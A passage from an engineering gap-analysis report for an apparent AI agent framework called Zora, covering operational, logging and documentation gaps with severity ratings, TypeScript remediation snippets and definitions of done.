     res.sendFile(path.join(distPath, 'index.html'));
   });
   ```

3. **Run build on first startup if dist missing:**
   ```typescript
   async function ensureFrontendBuilt() {
     const distPath = path.join(__dirname, '../dashboard/frontend/dist');

     if (!fs.existsSync(distPath)) {
       logger.info('Frontend build missing; building now...');
       await exec('npm run build:frontend', { cwd: __dirname });
       logger.info('Frontend build complete');
     }
   }

   // Call before starting server
   await ensureFrontendBuilt();
   startDashboardServer();
   ```

4. **Verify build output in CI/CD:**
   - Build frontend in CI pipeline
   - Verify dist/ directory has expected files (index.html, main.js, etc.)
   - Fail build if frontend compilation fails
   - Include frontend in deployment artifacts

5. **Add development hot reload:**
   ```typescript
   // In development mode, proxy to Vite dev server
   if (process.env.NODE_ENV === 'development') {
     const { createProxyMiddleware } = require('http-proxy-middleware');
     app.use('/', createProxyMiddleware({
       target: 'http://localhost:5173', // Vite dev server
       changeOrigin: true,
       ws: true
     }));
   }
   ```

**Success Criteria:**
- `npm run build` compiles frontend and backend successfully
- `/src/dashboard/frontend/dist/` contains compiled React app
- index.html, main.js, and CSS files present in dist/
- Dashboard server serves static files correctly
- Browser can load dashboard UI
- React components render without errors
- API calls from frontend work correctly

**Verification:**
- Manual build: `npm run build` succeeds
- Static files accessible: curl http://localhost:3000/
- Dashboard UI renders: browser shows dashboard page
- CI/CD verifies frontend compilation
- Deployment includes frontend build artifacts

**Dependencies:**
- Depends on OPS-02 (API endpoints must be working)
- Unblocks R15 and complete dashboard functionality

---

#### OPS-04: GeminiProvider Unbounded Buffer

**Severity:** S2 (High)
**Effort:** 1h
**Blocking:** No
**Category:** RESOURCE MANAGEMENT
**Files Affected:** 1
**Impact Level:** 3/5

**Description:**

The GeminiProvider accumulates streaming output in a buffer without size limits, causing runaway memory consumption on extended or high-volume sessions:

```typescript
// Problematic code at src/providers/gemini-provider.ts:149
private buffer = '';

async onStreamChunk(chunk: string) {
  this.buffer += chunk; // Buffer grows indefinitely
  // Process and accumulate...
}
```

This implementation has critical resource management deficiencies:

**Specific Failure Modes:**
- Buffer accumulates all streaming output without limit
- Long conversations or high-volume output exhaust RAM
- No truncation or cleanup mechanism
- Memory usage grows proportionally with session duration
- System eventually runs out of memory; crashes or freezes
- Particularly severe with verbose providers or large tool outputs

**Impact Assessment:**
- **Resource Leaks:** CRITICAL - Unbounded memory growth
- **Availability:** CRITICAL - System crashes under sustained load
- **Production Readiness:** CRITICAL - Cannot handle extended sessions
- **Operational Impact:** SEVERE - Requires manual restart/cleanup
- **Blocking Roadmap:** Blocks R28 (production resource management)

**Roadmap Blocking:**
- R28: Production resource management and monitoring

**Recommended Solution:**

1. **Implement 50MB buffer cap with truncation:**
   ```typescript
   private buffer = '';
   private readonly MAX_BUFFER_SIZE = 50 * 1024 * 1024; // 50MB
   private bufferTruncated = false;

   async onStreamChunk(chunk: string) {
     this.buffer += chunk;

     if (this.buffer.length > this.MAX_BUFFER_SIZE) {
       if (!this.bufferTruncated) {
         logger.warn('GeminiProvider buffer exceeding limit; truncating', {
           currentSize: this.buffer.length,
           limit: this.MAX_BUFFER_SIZE,
           provider: 'gemini'
         });
         this.bufferTruncated = true;
       }

       // Keep most recent MAX_BUFFER_SIZE bytes
       const excess = this.buffer.length - this.MAX_BUFFER_SIZE;
       this.buffer = this.buffer.slice(excess);

       // Emit warning event
       this.emit('warning', {
         type: 'buffer_truncated',
         size: excess,
         message: 'Output buffer truncated; excess data discarded'
       });
     }

     // Process chunk...
     this.processChunk(chunk);
   }
   ```

2. **Add buffer metrics and monitoring:**
   ```typescript
   getBufferMetrics() {
     return {
       currentSize: this.buffer.length,
       maxSize: this.MAX_BUFFER_SIZE,
       utilizationPercent: (this.buffer.length / this.MAX_BUFFER_SIZE) * 100,
       truncated: this.bufferTruncated,
       chunks: this.chunkCount,
       timestamp: Date.now()
     };
   }

   // Emit metrics periodically
   setInterval(() => {
     const metrics = this.getBufferMetrics();
     if (metrics.utilizationPercent > 80) {
       logger.warn('GeminiProvider buffer utilization high', metrics);
     }
   }, 30000); // Every 30 seconds
   ```

3. **Implement buffer cleanup on completion:**
   ```typescript
   async complete() {
     const finalSize = this.buffer.length;
     this.buffer = ''; // Clear buffer
     this.bufferTruncated = false;

     logger.info('GeminiProvider session complete; buffer cleared', {
       finalSize,
       truncated: this.bufferTruncated
     });
   }
   ```

4. **Add configuration for buffer limits:**
   ```typescript
   interface ProviderConfig {
     maxBufferSize?: number; // Bytes
     bufferTruncationPolicy?: 'discard' | 'spillToDisk';
   }

   // Allow operators to tune limits per environment
   const config = {
     maxBufferSize: process.env.PROVIDER_MAX_BUFFER || 50 * 1024 * 1024,
     bufferTruncationPolicy: 'discard' // or 'spillToDisk' for temp storage
   };
   ```

5. **Consider spill-to-disk for large outputs:**
   ```typescript
   async onStreamChunk(chunk: string) {
     // Attempt to add to buffer
     if (this.buffer.length + chunk.length > this.MAX_BUFFER_SIZE) {
       // Spill to temp file instead of discarding
       if (!this.tempFile) {
         this.tempFile = fs.createWriteStream(
           path.join(os.tmpdir(), `zora-buffer-${this.sessionId}.tmp`)
         );
       }
       this.tempFile.write(chunk);
     } else {
       this.buffer += chunk;
     }
   }
   ```

**Success Criteria:**
- Buffer size capped at 50MB maximum
- Truncation warning logged when limit exceeded
- Metrics endpoint reports buffer utilization
- Extended sessions do not consume unlimited memory
- No crashes due to buffer exhaustion
- Operations can monitor buffer health

**Verification:**
- Unit tests verify buffer truncation at limit
- Load testing with extended sessions confirms bounded memory
- Metrics show 0% memory growth after limit reached
- Warning events emitted correctly on truncation
- No data corruption from truncation

**Dependencies:**
- Independent of other gaps; can be fixed immediately
- Enables R28 (production resource management)

---

#### OPS-05: No Structured Logging

**Severity:** S2 (High)
**Effort:** 3h
**Blocking:** No
**Category:** OBSERVABILITY
**Files Affected:** 36+ (distributed console.log calls)
**Impact Level:** 3/5

**Description:**

The Zora codebase contains 136 scattered `console.log` calls with inconsistent formatting, preventing structured observability and making debugging and monitoring extremely difficult:

```typescript
// Examples of inconsistent logging scattered throughout codebase
console.log('Agent started'); // No timestamp
console.log(`Processing: ${task}`); // Inline data, hard to parse
console.error('Error:', err); // Unstructured error format
console.warn('Warning'); // No context
// No trace IDs, no request IDs, no structured fields
```

This implementation has critical observability deficiencies:

**Specific Failure Modes:**
- No timestamp on console output; cannot correlate with events
- No structured fields; logs hard to parse and search
- No log levels consistently applied
- No trace IDs for request tracking across components
- No correlation with metrics or alarms
- Console output lost when redirected or piped
- Impossible to debug production issues with only console.log
- No log rotation or storage; logs fill up disk or disappear

**Impact Assessment:**
- **Operability:** CRITICAL - Cannot debug production issues
- **Monitoring:** CRITICAL - No structured logs for alerting/dashboards
- **Security:** SEVERE - No audit trail or security event tracking
- **Compliance:** SEVERE - Cannot meet audit logging requirements
- **Troubleshooting:** SEVERE - Production support blind without logs
- **Blocking Roadmap:** Blocks R23 (operational observability)

**Roadmap Blocking:**
- R23: Production operational observability and monitoring

**Recommended Solution:**

1. **Implement structured JSON logger (pino or winston):**
   ```typescript
   // Create logger utility
   // src/utils/logger.ts
   import pino from 'pino';
   import path from 'path';

   const logger = pino({
     level: process.env.LOG_LEVEL || 'info',
     transport: {
       target: 'pino-pretty',
       options: {
         colorize: true,
         translateTime: 'SYS:standard',
         singleLine: false
       }
     },
     timestamp: pino.stdTimeFunctions.isoTime
   });

   // In production, add file rotation
   if (process.env.NODE_ENV === 'production') {
     const transport = pino.transport({
       targets: [
         {
           level: 'info',
           target: 'pino/file',
           options: { destination: '/var/log/zora/app.log' }
         },
         {
           level: 'error',
           target: 'pino/file',
           options: { destination: '/var/log/zora/error.log' }
         }
       ]
     });
     logger.addTransport(transport);
   }

   export { logger };
   ```

2. **Replace all console.log calls with structured logging:**
   ```typescript
   // Before
   console.log('Processing task:', task.id);
   console.error('Error processing task:', err);

   // After
   logger.info({ taskId: task.id }, 'Processing task');
   logger.error({
     taskId: task.id,
     error: err.message,
     stack: err.stack
   }, 'Error processing task');
   ```

3. **Add request/trace ID propagation:**
   ```typescript
   // Create middleware for request tracking
   import { v4 as uuidv4 } from 'uuid';

   app.use((req, res, next) => {
     req.id = req.headers['x-request-id'] || uuidv4();
     req.logger = logger.child({ requestId: req.id });
     next();
   });

   // Use in all handlers
   app.get('/api/jobs', (req, res) => {
     req.logger.info('Fetching jobs list');
     const jobs = JobManager.list();
     req.logger.info({ jobCount: jobs.length }, 'Jobs fetched successfully');
     res.json(jobs);
   });
   ```

4. **Implement structured context logging:**
   ```typescript
   // Log events with consistent structure
   logger.info({
     event: 'session_started',
     sessionId: session.id,
     userId: session.userId,
     timestamp: Date.now(),
     metadata: {
       provider: 'gemini',
       model: 'gemini-pro',
       maxTokens: 4096
     }
   }, 'Session initialized');

   logger.error({
     event: 'provider_error',
     sessionId: session.id,
     provider: 'gemini',
     error: err.message,
     errorCode: err.code,
     retryCount: retryAttempt,
     timestamp: Date.now()
   }, 'Provider invocation failed');
   ```

5. **Add log levels and filtering:**
   ```typescript
   // Use appropriate log levels
   logger.trace({ details }, 'Detailed trace information');
   logger.debug({ debugInfo }, 'Debug-level information');
   logger.info({ event }, 'Informational message');
   logger.warn({ issue }, 'Warning condition');
   logger.error({ error }, 'Error condition');
   logger.fatal({ critical }, 'Fatal error requiring shutdown');

   // Filter by level in different environments
   // Development: DEBUG+
   // Staging: INFO+
   // Production: WARN+
   ```

6. **Add performance/metrics logging:**
   ```typescript
   const start = Date.now();
   const result = await provider.invoke(request);
   const duration = Date.now() - start;

   logger.info({
     event: 'provider_invocation_complete',
     provider: 'gemini',
     duration,
     tokensUsed: result.tokens,
     success: true,
     durationExceeded: duration > 5000 ? 'yes' : 'no'
   }, 'Provider invocation completed');
   ```

7. **Set up log aggregation in production:**
   - Centralized log collection (ELK, Splunk, CloudWatch)
   - Log retention policies
   - Automated alerts on error patterns
   - Dashboard for log searching and analysis

**Success Criteria:**
- All 136 console.log calls replaced with structured logger
- Structured JSON format with timestamp, level, and context
- Request/trace ID propagation through entire stack
- Log rotation and retention configured
- Error events include stack traces and context
- Performance metrics logged for monitoring
- Zero console.log in production code

**Verification:**
- Code audit confirms no raw console.log calls (only logger.*)
- Integration tests verify structured log format
- Logs can be parsed and searched programmatically
- Metrics dashboard displays log-based statistics
- Compliance audit confirms audit trail completeness
- Production logs demonstrate structured format

**Dependencies:**
- Independent of other gaps; can be fixed immediately
- Enables R23 (operational observability)

---

### Summary Table: Operational Gaps

| Gap ID | Issue | Risk Level | Effort | Blocking | Priority |
|--------|-------|-----------|--------|----------|----------|
| **OPS-01** | CLI Daemon Commands Are Stubs | Service management | 3h | Yes | P0 |
| **OPS-02** | Dashboard `GET /api/jobs` Returns Empty Placeholder | Observability | 2h | Yes | P0 |
| **OPS-03** | No Frontend Build Output | UI delivery | 1h | Yes | P0 |
| **OPS-04** | GeminiProvider Unbounded Buffer | Resource leak | 1h | No | P1 |
| **OPS-05** | No Structured Logging | Observability | 3h | No | P1 |

**Total Effort:** 10 hours
**Critical Path (P0):** 6 hours (OPS-01, OPS-02, OPS-03)
**Production Blockers:** 3 gaps (OPS-01, OPS-02, OPS-03)

**Parallelization:** OPS-01, OPS-02, OPS-03 can be worked in parallel; OPS-02 requires OPS-01 for actual session data; OPS-04 and OPS-05 independent of others

---

## 11. LOGGING & OBSERVABILITY GAPS (4 gaps)

The Zora framework uses 136 console.log calls scattered throughout the codebase without structured logging, making production debugging nearly impossible. Events lack source attribution, no metrics are exposed, and silent errors in async operations hide failures. This section details observability gaps that prevent operational visibility and reliable troubleshooting.

---

### LOG-01: Console.log Used Throughout
**Severity:** S3 | **Functionality Impact:** 2 | **Reliability:** 2 | **Security:** 1
**Effort:** 3h | **Blocking:** N | **Status:** Open

#### Description
The codebase contains 136+ console.log, console.error, and console.warn calls scattered across 15+ files with no consistent structure, formatting, or machine-parseable format. Log output is unstructured text that is impossible to search, filter, or correlate across distributed components. Production operators cannot distinguish between debug info and critical errors; logs cannot be aggregated into centralized logging systems (ELK, DataDog, Splunk, CloudWatch).

#### Current State
- **Location:** `/home/user/zora/src/orchestration/`, `/home/user/zora/src/providers/`, `/home/user/zora/src/security/`, and other directories
- **Example Pattern:**
```typescript
// Scattered throughout codebase
console.log('Task started', taskId);
console.error('Failed to execute:', error.message);
console.warn('Provider degraded');
// No timestamp, no context, no machine-readable format
// Different format in each location
```
- **Estimated Count:** 136+ calls across 15+ files
- **Related Gaps:** LOG-02 (Silent Errors), LOG-03 (No Instrumentation)

#### Expected State
Unified JSON logger that emits structured logs with:
- Timestamp (ISO 8601)
- Log level (DEBUG, INFO, WARN, ERROR, CRITICAL)
- Source/component name
- Event context (task ID, provider, user, etc.)
- Machine-parseable format for ingestion into observability platforms
- Optional stack trace for errors
- Correlation IDs for distributed tracing

Example output:
```json
{
  "timestamp": "2026-02-14T15:30:45.123Z",
  "level": "ERROR",
  "source": "execution-loop",
  "message": "Task execution failed",
  "taskId": "abc-123",
  "provider": "claude",
  "error": "rate_limit_error",
  "duration_ms": 2500,
  "correlationId": "req-xyz-789"
}
```

#### Why It Matters
Structured logging enables:
1. **Production Debugging:** Search logs by task ID, provider, error type
2. **Alerting:** Set thresholds on error rates, response times
3. **Monitoring:** Track performance trends and degradation patterns
4. **Compliance:** Audit trail with full context for incidents
5. **Integration:** Send logs to DataDog, Splunk, CloudWatch, etc.

Without structured logging, diagnosing production issues requires manual log review; correlation across components is impossible.

#### Remediation Approach
**Strategy:** Create a structured Logger utility (not console.log) that emits JSON-formatted logs with timestamp, level, context, and source. Replace all console.log/error/warn calls with logger.info(), logger.error(), etc. Configure log level via environment variable.

**Affected Files:**
- `/home/user/zora/src/utils/logger.ts` — Create unified logger utility
- `/home/user/zora/src/orchestration/execution-loop.ts` — Replace console.log with logger
- `/home/user/zora/src/providers/*.ts` — Replace console.log in all providers
- `/home/user/zora/src/security/audit-logger.ts` — Replace console.log in audit
- All other files with console.log calls

**Dependencies:** None - can be implemented independently

**Test Coverage:**
- Verify logger outputs valid JSON
- Verify log levels respected (DEBUG filtered when level=INFO)
- Verify context fields included (task ID, provider, etc.)
- Verify logs can be parsed by jq and standard JSON tools

**Definition of Done:**
- [ ] Logger utility created with DEBUG, INFO, WARN, ERROR, CRITICAL levels
- [ ] All console.log calls replaced with logger.info/error/warn
- [ ] Log output is valid JSON with timestamp, source, level, context
- [ ] Configuration via LOG_LEVEL environment variable
- [ ] No more than 2 console.log calls remaining (reserved for critical startup)

---

### LOG-02: Silent Errors in Async Operations
**Severity:** S2 | **Functionality Impact:** 3 | **Reliability:** 3 | **Security:** 2
**Effort:** 2h | **Blocking:** N | **Status:** Open

#### Description
Multiple Promise chains in the codebase use `.then(...).catch(() => {})` patterns that silently swallow errors without logging or alerting. When async operations fail (API calls, file operations, database writes), the failures are invisible. The system appears to continue working while tasks silently fail.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/`, `/home/user/zora/src/providers/`
- **Code Pattern:**
```typescript
// Promise handlers without error logging
somePromise
  .then(result => processResult(result))
  .catch(() => {}); // Silent failure - no logging

// Async function not awaited
asyncFunction().catch(() => {}); // Silent failure

// Event listener without error handling
emitter.on('event', async (data) => {
  await riskyOperation(); // Error ignored if no await in caller
});
```
- **Estimated Count:** 10+ locations
- **Related Gaps:** LOG-01 (Structured Logging), ERR-02 (Provider Errors)

#### Expected State
All Promise catch blocks log errors explicitly with context:
- Error message and type
- Stack trace for debugging
- Context (operation name, resource, IDs)
- Task/request correlation ID
- Timestamp

Errors propagate to error handling pipeline for retry/failover decisions or alerting.

#### Why It Matters
Silent errors hide system failures:
1. **User Impact:** Tasks fail without any feedback; users retry manually
2. **Debugging Difficulty:** No error logs to investigate; appears to work
3. **Data Loss Risk:** Failed operations may not retry; data dropped
4. **System Health:** Cannot detect widespread failures
5. **Production Stability:** Cascading failures undetected until critical

#### Remediation Approach
**Strategy:** Replace all `.catch(() => {})` with explicit error logging. Use logger.error() with full context. For critical operations, re-throw errors or emit error events for escalation.

**Affected Files:**
- `/home/user/zora/src/orchestration/execution-loop.ts` — Promise error logging
- `/home/user/zora/src/providers/*.ts` — API call error handling
- All files with bare `.catch()` blocks

**Dependencies:** LOG-01 (Structured Logger)

**Test Coverage:**
- Verify errors are logged when promises reject
- Verify error context includes operation name and IDs
- Verify errors logged at ERROR level
- Verify critical errors propagate/re-throw

**Definition of Done:**
- [ ] No `.catch(() => {})` blocks remain (all errors logged)
- [ ] Error logs include context (operation, resource, IDs)
- [ ] Critical errors re-thrown or emitted for escalation
- [ ] Integration test verifies error logging on failure scenarios

---

### LOG-03: No Health Check Instrumentation
**Severity:** S2 | **Functionality Impact:** 3 | **Reliability:** 3 | **Security:** 1
**Effort:** 2h | **Blocking:** N | **Status:** Open

#### Description
The AuthMonitor, HeartbeatSystem, and RoutineManager services run (when they run) but produce no observable metrics or health status. There is no `/metrics` endpoint, no Prometheus-style metrics, and no health check API. Operators cannot determine system health, provider availability, or service status without querying internal state directly.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/auth-monitor.ts`, `/home/user/zora/src/orchestration/heartbeat-system.ts`, `/home/user/zora/src/orchestration/routine-manager.ts`
- **Missing Instrumentation:**
```typescript
// AuthMonitor runs but no metrics emitted
async checkAuth(): Promise<void> {
  // Check provider tokens...
  // No metrics on check results, token expiry times, failures
}

// No health endpoint
// GET /health endpoint doesn't exist
// No Prometheus metrics
```
- **Related Gaps:** LOG-01 (Structured Logging), ORCH-04 (AuthMonitor Never Scheduled)

#### Expected State
Prometheus-style metrics or health status JSON endpoint:
- Health status: OK, DEGRADED, CRITICAL
- Provider availability (per provider)
- Token expiry times (hours until expiry)
- Last health check timestamp
- Error counts and rates
- Resource utilization (memory, CPU if available)

Example `/health` response:
```json
{
  "status": "OK",
  "timestamp": "2026-02-14T15:30:45Z",
  "providers": {
    "claude": { "status": "OK", "tokenExpiresIn": 86400 },
    "ollama": { "status": "OK", "responseTime": 125 },
    "gemini": { "status": "DEGRADED", "error": "rate_limited" }
  },
  "system": { "uptime": 3600, "memoryUsage": "256MB" }
}
```

#### Why It Matters
Observable health enables:
1. **Operational Dashboards:** See system health at a glance
2. **Alerting:** Alert on degraded providers, service downtime
3. **Auto-Recovery:** Orchestration can restart services based on health
4. **Load Balancing:** Route requests away from degraded providers
5. **SLA Monitoring:** Track uptime and availability

Without health instrumentation, operators are blind to system state.

#### Remediation Approach
**Strategy:** Add metrics collection to core services (AuthMonitor, HeartbeatSystem, etc.). Expose via `/health` HTTP endpoint (JSON) or Prometheus `/metrics` endpoint. Track provider availability, token expiry, error rates, and latencies.

**Affected Files:**
- `/home/user/zora/src/orchestration/auth-monitor.ts` — Emit provider health metrics
- `/home/user/zora/src/orchestration/heartbeat-system.ts` — Track health status
- `/home/user/zora/src/api/health-controller.ts` — New endpoint or extend existing API
- `/home/user/zora/src/orchestration/metrics.ts` — Central metrics collection

**Dependencies:** LOG-01 (Structured Logging)

**Test Coverage:**
- Verify `/health` endpoint returns status for all providers
- Verify token expiry times calculated correctly
- Verify error counts incremented on failures
- Verify metrics updated periodically

**Definition of Done:**
- [ ] `/health` endpoint exists and returns provider status
- [ ] Token expiry times tracked and exposed
- [ ] Error rates and counts tracked per provider
- [ ] Prometheus metrics endpoint `/metrics` (optional, for monitoring systems)
- [ ] Dashboard can query and visualize health status

---

### LOG-04: Event Stream Lacks Source Attribution
**Severity:** S3 | **Functionality Impact:** 2 | **Reliability:** 2 | **Security:** 1
**Effort:** 1h | **Blocking:** N | **Status:** Open

#### Description
AgentEvent objects emitted by the system lack a `source` field identifying which provider or component emitted them. When an event of `type: 'text'` arrives at the dashboard or is logged, there's no way to know whether it came from Claude, Ollama, or Gemini. This makes debugging, attribution, and billing difficult.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/event.ts`, `/home/user/zora/src/providers/*.ts`
- **Current Event Structure:**
```typescript
interface AgentEvent {
  type: 'text' | 'error' | 'tool_call' | ...;
  timestamp: number;
  content: string; // For text events
  // Missing: source provider identification
}

// Example event (incomplete attribution)
{
  type: 'text',
  timestamp: 1707937445123,
  content: 'Analysis complete'
  // Which provider sent this? Unknown!
}
```
- **Affected Locations:** 5+ files using AgentEvent
- **Related Gaps:** LOG-01 (Structured Logging)

#### Expected State
AgentEvent includes `source` field:
```typescript
interface AgentEvent {
  type: 'text' | 'error' | 'tool_call' | ...;
  timestamp: number;
  source: 'claude' | 'ollama' | 'gemini' | 'system'; // NEW
  content: string;
  // Optional tracing
  correlationId?: string;
  taskId?: string;
}

// Example with source attribution
{
  type: 'text',
  timestamp: 1707937445123,
  source: 'claude',  // Now we know!
  content: 'Analysis complete',
  taskId: 'task-xyz-123'
}
```

#### Why It Matters
Source attribution enables:
1. **Provider Metrics:** Track performance per provider (latency, error rate)
2. **Billing Accuracy:** Charge correct provider for usage
3. **Debugging:** Trace issues to specific provider behavior
4. **Multi-Provider Failover:** Understand which provider handled each step
5. **Audit Trails:** Prove which system produced which result

#### Remediation Approach
**Strategy:** Add `source: string` field to AgentEvent interface. Update all providers and system components to include source when emitting events. Update event serialization/deserialization to preserve source.

**Affected Files:**
- `/home/user/zora/src/orchestration/event.ts` — Add source field to interface
- `/home/user/zora/src/providers/claude-provider.ts` — Include source in events
- `/home/user/zora/src/providers/ollama-provider.ts` — Include source in events
- `/home/user/zora/src/providers/gemini-provider.ts` — Include source in events
- `/home/user/zora/src/orchestration/execution-loop.ts` — Add system as source for framework events

**Dependencies:** None - can be implemented independently

**Test Coverage:**
- Verify all provider events include source field
- Verify source value matches provider name
- Verify system events have source='system'
- Verify events serialized/deserialized with source preserved

**Definition of Done:**
- [ ] AgentEvent interface includes source field
- [ ] All providers emit events with correct source
- [ ] System components emit events with source='system'
- [ ] Events logged/stored with source for attribution
- [ ] Unit tests verify source field in all event types

---

### Summary Table: Logging & Observability Gaps

| Gap ID | Issue | Severity | Effort | Files | Impact |
|--------|-------|----------|--------|-------|--------|
| LOG-01 | Console.log Used Throughout | S3 | 3h | 15+ | Cannot debug production issues |
| LOG-02 | Silent Errors in Async Operations | S2 | 2h | 10+ | Failures invisible to operators |
| LOG-03 | No Health Check Instrumentation | S2 | 2h | 3+ | No system health visibility |
| LOG-04 | Event Stream Lacks Source Attribution | S3 | 1h | 5+ | Provider attribution impossible |

**Cumulative Effort:** 8 hours
**Impact:** Production observability severely limited; debugging nearly impossible

---

## 12. DOCUMENTATION GAPS (5 gaps)

Zora's documentation is fragmented and incomplete: inline code comments are sparse, no architecture decision records exist explaining design choices, provider implementation is undocumented making it difficult to add new providers, configuration is partially explained, and troubleshooting guidance is absent. This section details documentation gaps that impede onboarding, maintainability, and troubleshooting.

---

### DOC-01: Sparse Inline Explanations in Complex Modules
**Severity:** S3 | **Functionality Impact:** 1 | **Reliability:** 2 | **Security:** 1
**Effort:** 2h | **Blocking:** N | **Status:** Open

#### Description
While file-level block comments are present, function-level explanations are sparse in complex modules. The orchestration layer (`/src/orchestration/`), security policy engine (`/src/security/`), and provider implementations lack inline documentation explaining non-obvious logic. New contributors cannot understand the code without extensive reverse-engineering; refactoring introduces bugs due to undocumented invariants.

#### Current State
- **Location:** `/home/user/zora/src/orchestration/`, `/home/user/zora/src/security/`
- **Example Gap:**
```typescript
// File-level comment exists
/**
 * ExecutionLoop manages task execution pipeline
 */
export class ExecutionLoop {

  // Function-level comment missing!
  async executeTask(task: Task): Promise<TaskResult> {
    // Complex logic here but no explanation
    // Why these steps in this order?
    // What invariants must hold?
    // What side effects occur?
  }

  // Confusing variable name, no explanation
  const _failoverChain = determineFailoverStrategy(task);
  // What does this compute? How is it used?

  // Non-obvious conditionals
  if (context.priority > 50 && !context.isRetry) {
    // Why this specific threshold?
    // What's the semantic meaning?
  }
}
```
- **Affected Files:** 5+ modules (orchestration, security)
- **Related Gaps:** DOC-02 (Architecture Decisions), DOC-03 (Provider Guide)

#### Expected State
Complex functions have JSDoc comments explaining:
- Purpose and preconditions
- Parameters and return value semantics
- Non-obvious logic with "why" not just "what"
- Important side effects
- Failure modes and error handling

Example:
```typescript
/**
 * Execute a task through the provider, with failover if needed.
 *
 * Preconditions:
 * - task.provider must be valid or Router will select default
 * - context.history must contain previous related tasks (may be empty)
 *
 * Process:
 * 1. Inject context from MemoryManager if missing
 * 2. Call Router.selectProvider() if no provider specified
 * 3. Execute task via provider.execute()
 * 4. On provider error, delegate to FailoverController (see ERR-04)
 * 5. Persist events via SessionManager for audit trail
 *
 * Returns: TaskResult with status (success/failure) and events
 *
 * Side effects:
 * - Updates task history in SessionManager
 * - Emits events during execution
 * - May switch provider if failover triggered
 */
async executeTask(task: Task): Promise<TaskResult> {
  // ...
}
```

#### Why It Matters
Clear inline documentation enables:
1. **Onboarding:** New contributors understand code quickly
2. **Refactoring Safety:** Document invariants; refactor without breaking assumptions
3. **Debugging:** Understand intent when investigating issues
4. **Maintenance:** Future changes have clear constraints
5. **Code Review:** Reviewers understand non-obvious design decisions

#### Remediation Approach
**Strategy:** Add JSDoc comments to all public functions and complex private functions in orchestration and security modules. Focus on "why" and preconditions, not just "what". Document important invariants and side effects.

**Affected Files:**
- `/home/user/zora/src/orchestration/execution-loop.ts` — Add JSDoc to all functions
- `/home/user/zora/src/orchestration/router.ts` — Document selection logic
- `/home/user/zora/src/orchestration/failover-controller.ts` — Document failover strategy
- `/home/user/zora/src/security/policy-engine.ts` — Document policy enforcement
- Other complex modules in orchestration and security

**Dependencies:** None - can be completed independently

**Test Coverage:**
- Verify all public functions have JSDoc
- Verify comments explain "why" for non-obvious logic
- Verify comments document preconditions and side effects

**Definition of Done:**
- [ ] All public functions in orchestration modules have JSDoc
- [ ] All complex private functions have explanatory comments
- [ ] Comments explain purpose, preconditions, and important side effects
- [ ] Security module functions document policy enforcement logic
- [ ] Code review checklist includes documentation completeness

---

### DOC-02: No Architecture Decision Records (ADRs)
**Severity:** S3 | **Functionality Impact:** 1 | **Reliability:** 1 | **Security:** 2
**Effort:** 3h | **Blocking:** N | **Status:** Open

#### Description
No architecture decision records exist. Large design decisions (orchestrator architecture, multi-provider routing, failover strategy) are documented only in REMEDIATION_ROADMAP.md or scattered in comments. New team members cannot explain "why" the system is designed this way. Teams cannot understand context for past decisions when refactoring or extending.

#### Current State
- **Location:** No `/docs/adr/` directory exists
- **Current Documentation:** Only REMEDIATION_ROADMAP.md and inline comments
- **Problem:**
```
Design decisions are not captured:
- Why is FailoverController separate from ExecutionLoop?
- Why does Router use classification instead of user hints only?
- Why are events persisted to SessionManager?
- Why this retry backoff strategy?
- Trade-offs: performance vs. reliability, cost vs. latency
```
- **Related Gaps:** DOC-01 (Inline Explanations), DOC-03 (Provider Guide)

#### Expected State
Architecture Decision Records (ADRs) directory with one file per decision:
```
docs/adr/
├── ADR-001-orchestrator-architecture.md
├── ADR-002-multi-provider-routing.md
├── ADR-003-failover-strategy.md
├── ADR-004-event-persistence.md
└── ADR-005-retry-backoff-algorithm.md
```

Each ADR contains:
1. **Title and Status** (Proposed/Accepted/Superseded)
2. **Context:** Problem being solved, constraints, requirements
3. **Decision:** What was decided and why
4. **Consequences:** Trade-offs, benefits, risks of decision
5. **Alternatives Considered:** Other options and why rejected
6. **Related Decisions:** Links to related ADRs

Example ADR structure:
```markdown
# ADR-001: Orchestrator Architecture

## Status
Accepted

## Context
The framework needed to coordinate multiple services (ExecutionLoop,
FailoverController, RetryQueue, AuthMonitor, etc.) but had no central
coordinator. Each component was instantiated separately, preventing
coordinated operation.

## Decision
Create central Orchestrator class that:
- Instantiates all services in dependency order
- Owns lifecycle (boot, shutdown, health checks)
- Provides unified interface (submitTask, queryStatus)

## Consequences
- Simpler startup: one orchestrator.boot() call
- Unified error handling and logging
- Clearer separation of concerns
- Central point for monitoring and control
- Trade-off: Adding abstraction layer increases complexity

## Alternatives Considered
- Individual component startup (rejected: too error-prone)
- Message queue coordination (rejected: overkill for single process)
- Dependency injection framework (rejected: too heavyweight)
```

#### Why It Matters
ADRs enable:
1. **Knowledge Transfer:** Explain reasoning to new team members
2. **Context for Changes:** Understand constraints when refactoring
3. **Avoiding Regressions:** Document "why" to prevent re-breaking settled decisions
4. **Alternative Exploration:** When considering changes, understand what was tried
5. **Onboarding:** Faster ramp-up for new engineers

#### Remediation Approach
**Strategy:** Create `/docs/adr/` directory and write ADRs for key decisions: orchestrator design, multi-provider routing, failover/retry strategy, event persistence, error handling approach. Use standard ADR template for consistency.

**Affected Files:**
- `/home/user/zora/docs/adr/` — New directory
- ADR files for: Orchestrator, Routing, Failover, Events, Retry
- `/home/user/zora/docs/adr/README.md` — ADR index and template

**Dependencies:** None - can be written independently

**Test Coverage:**
- N/A (documentation)

**Definition of Done:**
- [ ] `/docs/adr/` directory created with README
- [ ] ADR template established and documented
- [ ] At least 5 ADRs written (orchestrator, routing, failover, events, retry)
- [ ] Each ADR explains "why" and documents trade-offs
- [ ] ADRs linked in main README for discoverability

---

### DOC-03: Provider Implementation Guide Missing
**Severity:** S3 | **Functionality Impact:** 1 | **Reliability:** 2 | **Security:** 1
**Effort:** 2h | **Blocking:** N | **Status:** Open

#### Description
Three providers exist (Claude, Gemini, Ollama) but no template or guide for implementing a fourth provider. Adding a new provider (LLaMA, Claude Desktop, local model, etc.) requires reverse-engineering existing providers. No quick-start checklist exists.

#### Current State
- **Location:** `/home/user/zora/src/providers/`
- **Current Providers:** claude-provider.ts, gemini-provider.ts, ollama-provider.ts
- **Problem:**
```
To add a new provider, developer must:
1. Study existing provider implementations
2. Infer the interface and patterns
3. Implement all methods (no clear spec)
4. Figure out error handling patterns
5. Update Router to include new provider
6. Register in dependency injection

There's no quickstart guide!
```
- **Related Gaps:** DOC-01 (Inline Explanations), DOC-02 (ADRs)

#### Expected State
Documentation at `/docs/PROVIDER_IMPLEMENTATION_GUIDE.md` with:
